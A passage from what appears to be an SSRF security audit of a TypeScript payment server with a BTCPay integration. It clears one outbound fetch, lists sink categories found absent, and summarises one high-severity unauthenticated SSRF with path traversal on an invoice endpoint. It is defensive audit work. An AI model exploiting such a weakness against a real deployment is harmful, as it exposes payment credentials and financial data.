The following external HTTP requests were analyzed and confirmed **NOT vulnerable** to SSRF:

#### BTCPay Invoice Creation (Checkout)
**Location:** `/repos/exo/server/routes.ts:593-608`
**Sink:** `fetch()` with BTCPay Server URL
**Security:** ✅ SAFE - URL fully controlled by environment variables, no user input in URL construction

```typescript
const invoiceResp = await fetchWithRetry(
  `${BTCPAY_URL}/api/v1/stores/${BTCPAY_STORE_ID}/invoices`,
  {
    method: "POST",
    headers,
    body: JSON.stringify({ /* ... */ }),
  }
);
```

**User Input Location:** Request body only (invoice metadata), not URL
**Risk:** None for SSRF, potential for data injection if BTCPay Server is vulnerable

---

### NO ADDITIONAL SSRF SINKS FOUND

Exhaustive searches were conducted for the following SSRF attack vectors with **NO VULNERABLE CODE** discovered in network-accessible components:

#### HTTP Client Libraries ✅
- ❌ No axios usage
- ❌ No request/node-fetch usage (besides fetch in SSRF-001)
- ❌ No http.get/http.request with user input
- ❌ No urllib, httpx, or other HTTP clients

#### URL Fetchers & File Loaders ✅
- ❌ No file_get_contents (PHP)
- ❌ No fopen with URLs
- ❌ No URL.openStream (Java)
- ❌ No dynamic imports with user-controlled URLs

#### Redirect Handlers ✅
- ❌ No response.redirect with user input
- ❌ No Location header setting from user data
- ❌ No meta refresh tags with user-controlled URLs

#### Headless Browsers & Rendering ✅
- ❌ No Puppeteer usage
- ❌ No Playwright usage
- ❌ No Selenium WebDriver
- ❌ No PhantomJS
- ❌ No html-to-pdf converters (wkhtmltopdf, etc.)

#### Media Processors ✅
- ❌ No ImageMagick (convert, identify)
- ❌ No GraphicsMagick
- ❌ No FFmpeg with URL inputs
- ❌ No image optimization services with URL parameters

#### Link Preview & Metadata Fetchers ✅
- ❌ No oEmbed endpoint consumers
- ❌ No Open Graph metadata fetchers
- ❌ No URL unfurling/preview generation
- ❌ No social media card generators

#### Webhook & Callback Systems ✅
- ❌ No webhook receivers that fetch external URLs
- ❌ No "ping my endpoint" functionality
- ❌ No callback URL verification systems
- ❌ No health check notifiers with URLs

#### SSO/OIDC Discovery ✅
- ❌ No OpenID Connect discovery endpoint consumers
- ❌ No JWKS (JSON Web Key Set) fetchers
- ❌ No OAuth authorization server metadata fetchers
- ❌ No SAML metadata retrievers

#### Data Import & Feed Readers ✅
- ❌ No "import from URL" functionality
- ❌ No RSS/Atom feed readers
- ❌ No CSV/JSON/XML remote loaders
- ❌ No API synchronization with user-provided endpoints

#### Package & Plugin Installers ✅
- ❌ No "install from URL" features
- ❌ No package manager integration with user repos
- ❌ No plugin/theme downloaders
- ❌ No update mechanisms with remote checks

#### Cloud Metadata & Service Discovery ✅
- ❌ No AWS/GCP/Azure metadata service calls
- ❌ No container orchestration API clients
- ❌ No Kubernetes API interactions
- ❌ No service mesh configuration retrievers

---

### SSRF ATTACK SURFACE SUMMARY

**Total SSRF Vulnerabilities:** 1
**Severity Distribution:** 1 High
**Network-Accessible:** Yes (public API endpoint)
**Authentication Required:** No
**Rate Limiting:** 30 requests per 15 minutes (insufficient)

**Critical Finding:** The `/api/invoice/:invoiceId` endpoint is the **ONLY SSRF vulnerability** in the application but represents a **HIGH SEVERITY** risk due to:
- Public accessibility without authentication
- Ability to abuse payment processor API credentials
- Potential access to sensitive financial data
- Path traversal enabling arbitrary endpoint access

**Recommended Immediate Action:** Implement invoice ID validation and database verification before external API calls.

---

**END OF CODE ANALYSIS REPORT**
